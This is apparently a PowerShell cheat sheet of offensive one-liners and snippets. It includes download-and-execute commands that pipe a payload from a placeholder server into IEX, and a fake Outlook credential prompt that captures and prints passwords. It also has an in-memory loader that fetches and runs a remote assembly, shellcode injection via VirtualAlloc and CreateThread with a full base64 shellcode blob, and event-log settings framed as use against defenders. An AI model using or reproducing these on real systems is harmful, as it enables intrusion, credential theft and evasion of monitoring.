# 0. Get ipinfo, convert to JSON and open in a form
$IPs = "151.101.17.67", "192.12.94.30", "192.26.92.30"
$IPs | foreach {curl ipinfo.io/$_/json | ConvertFrom-Json} | ogv

# 1. invoke in memory 
"gwmi win32_Bios" | IEX
IEX (new-object net.webclient).downloadstring("http://myserver.com/payload.htm")
curl http://myserver.com/payload.htm | IEX

# 2. endoce URLs
[Net.WebUtility]::UrlEncode("/insider profiles/")

# 3. working with .net
[console]::CapsLock
("heLlo wOrld").ToCharArray() | % { [char]::IsUpper($_)}

# 3b. convert to Base64
[convert]::ToBase64String($([System.Text.Encoding]::Unicode.GetBytes("shutdown /r /t 0")))

# 4. get bytes to hex
[System.BitConverter]::ToString($([io.file]::ReadAllBytes("c:\temp\bios.exe")))

# 4b. bytes to raw hex
$b = [io.file]::ReadAllBytes("c:\temp\bios.exe")
($b | foreach { $_.ToString("X2") }) -join ""

# 5. One liner Credential phishing
$c = $Host.ui.PromptForCredential("Microsoft Outlook","Please enter your credentials","$env:userdomain\$env:username","")
$c.GetNetworkCredential() | fl *

# 5. Invoke powershell code from binary (or url) without launching powershell.exe or the actual binary process itself
function global:Invoke-InMemory {
[CmdletBinding()]
Param(
[String]$Path,

[String]$EncodedPayload
)

$source = @"
using System;
using System.Net;
using System.Reflection;

namespace mstsc
{
    public static class csharp
    {
        public static void LoadBinary(string url, string payload)
        {
        WebClient wc = new WebClient();
        Byte[] buffer = wc.DownloadData(url);
            var assembly = Assembly.Load(buffer);
var entry = assembly.EntryPoint;
var args = new string[2] {"-enc", payload};
var nothing = entry.Invoke(null, new object[] { args });
        }
    }
}
"@

if (-not ([System.Management.Automation.PSTypeName]'mstsc.csharp').Type)
{
    Add-Type -ReferencedAssemblies $Assem -TypeDefinition $source -Language CSharp
}
[mstsc.csharp]::LoadBinary($Path, $EncodedPayload)
}

# 6. Run C# directly 
$x = @'
public class test
{
    public static string Identity()
        {
            string Name = System.Security.Principal.WindowsIdentity.GetCurrent().Name; 
            return Name;
        }
}
'@

add-type $x

[test]::Identity()

# 6b. Invoke local variables & functions in Remote sessions
$x = "my local var"
Invoke-Command -session (Get-PSSession)[0] -scriptblock {$using:x}

function Get-Hostname {"running on $env:ComputerName"}
Invoke-Command -session (Get-PSSession)[0] -scriptblock ${function:Get-Hostname}

# 7. Get objects from apps/tools - convert strings without RegEx
$ns = @'

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    {LocalAddress*:0.0.0.0}:{LocalPort:135}            {RemoteAddress:0.0.0.0}:{RemotePort:0}              {State:LISTENING}       {PID:1052}
  TCP    {LocalAddress*:192.168.43.141}:{LocalPort:63152}   {RemoteAddress:185.70.40.151}:{RemotePort:443}      {State:ESTABLISHED}     {PID:11360}
'@

netstat -ano | ConvertFrom-String -TemplateContent $ns | more
$net = netstat -ano | ConvertFrom-String -TemplateContent $ns
$net | ? state -eq "established"

# 8. Real-world malware running shell code (ShellCode removed from var_code for your Own Safety!)
Set-StrictMode -Version 2

$DoIt = @'
$assembly = @"
	using System;
	using System.Runtime.InteropServices;
	namespace inject {
		public class func {
			[Flags] public enum AllocationType { Commit = 0x1000, Reserve = 0x2000 }
			[Flags] public enum MemoryProtection { ExecuteReadWrite = 0x40 }
			[Flags] public enum Time : uint { Infinite = 0xFFFFFFFF }
			[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
			[DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPt
r lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
			[DllImport("kernel32.dll")] public static extern int WaitForSingleObject(IntPtr hHandle, Time dwMilliseconds);
		}
	}
"@

$compiler = New-Object Microsoft.CSharp.CSharpCodeProvider
$params = New-Object System.CodeDom.Compiler.CompilerParameters
$params.ReferencedAssemblies.AddRange(@("System.dll", [PsObject].Assembly.Location))
$params.GenerateInMemory = $True
$result = $compiler.CompileAssemblyFromSource($params, $assembly)

[Byte[]]$var_code = [System.Convert]::FromBase64String("BLABLA-SHELL-CODE/1f9kJBDoU////1xcLlxwaXBlXHNwb29sc3M0NTY1MwAAAAAA")

$buffer = [inject.func]::VirtualAlloc(0, $var_code.Length + 1, [inject.func+AllocationType]::Reserve -bOr [inject.func+AllocationType]::Commit, [
inject.func+MemoryProtection]::ExecuteReadWrite)
if ([Bool]!$buffer) { 
	$global:result = 3; 
	return 
}
[System.Runtime.InteropServices.Marshal]::Copy($var_code, 0, $buffer, $var_code.Length)
[IntPtr] $thread = [inject.func]::CreateThread(0, 0, $buffer, 0, 0, 0)
if ([Bool]!$thread) {
	$global:result = 7; 
	return 
}
$result2 = [inject.func]::WaitForSingleObject($thread, [inject.func+Time]::Infinite)
'@

If ([IntPtr]::size -eq 8) {
	start-job { param($a) IEX $a } -RunAs32 -Argument $DoIt | wait-job | Receive-Job
}
else {
	IEX $DoIt
}

# Getting the Hex Raw (SHELL CODE) from the Base64 of var_code
$B64_ShellCode = '/OiJAAAAYInlMdJki1Iwi1IMi1IUi3IoD7dKJjH/McCsPGF8Aiwgwc8NAcfi8FJXi1IQi0I8AdCLQHiFwHRKAdBQi0gYi1ggAdPjPEmLNIsB1jH/McCswc8NAcc44HX0A334O30kdeJYi1gkAdNmiwxLi1gcAdOLBIsB0IlEJCRbW2FZWlH/4FhfWosS64ZdMcBqQGgAEAAAaP//BwBqAGhYpFPl/9VQ6agAAABaMclRUWgAsAQAaACwBABqAWoGagNSaEVw39T/1VCLFCRqAFJoKG994v/VhcB0bmoAagBqAInmg8YEieKDwgiLfCQMagBWagRSV2itnl+7/9WLVCQQagBWaAAgAABSV2itnl+7/9WFwHQUi0wkBIsEJAHIiQQki1QkEAHC69eLfCQMV2jA+t38/9VXaMaWh1L/1YsEJItMJAg5wXQHaPC1olb/1f9kJBDoU////1xcLlxwaXBlXHNwb29sc3M0NTY1MwAAAAAA'
[byte[]]$bytes=[System.Convert]::FromBase64String($B64_ShellCode)

# get raw hex of ShellCode
($bytes |  foreach { $_.ToString("X2") }) -join ""

# 9. Use Protected Event Logging against the defense (need to create a Document Encryption cert first)
Get-WinEvent -FilterHashtable @{logname='Microsoft-Windows-PowerShell/Operational'} -MaxEvents 10
Get-WinEvent -FilterHashtable @{logname='Microsoft-Windows-PowerShell/Operational'} -MaxEvents 1 | select -expandProperty message
New-Item "HKLM:\Software\Policies\Microsoft\Windows\EventLog\ProtectedEventLogging" -Force
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows\EventLog\ProtectedEventLogging" -Name EnableProtectedEventLogging -Value 1
Set-ItemProperty "HKLM:\Software\Policies\Microsoft\Windows\EventLog\ProtectedEventLogging" -Name EncryptionCertificate -Value (dir Cert:\CurrentUser\my)[0].Thumbprint
